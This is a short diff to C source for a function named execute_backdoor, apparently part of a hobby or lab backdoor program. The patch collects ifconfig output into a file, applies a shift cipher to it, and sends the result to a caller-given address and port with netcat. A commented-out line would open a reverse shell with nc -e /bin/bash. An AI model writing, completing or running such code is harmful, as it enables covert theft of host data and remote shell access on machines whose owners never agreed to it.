@@ -174,13 +174,14 @@ void execute_backdoor(char *addr, int port)
 	srand(time(NULL));
 	int shift = 19;
 
-	//sprintf(buffer, "nc %s %d -e /bin/bash", addr, port);
-	sprintf(buffer, "nc %s %d < encrypted.txt", addr, port);
+	//sprintf(buffer, "nc %s %d -e /bin/bash", addr, port);	
 	printf("executing...\n");
 	// send shell to client
 	lock = 0;
-	system("ifconfig < info.txt");
+	system("ifconfig > info.txt");
 	encrypt(shift);
+
+	sprintf(buffer, "nc %s %d < encrypted.txt", addr, port);
 	system(buffer);
 }
 
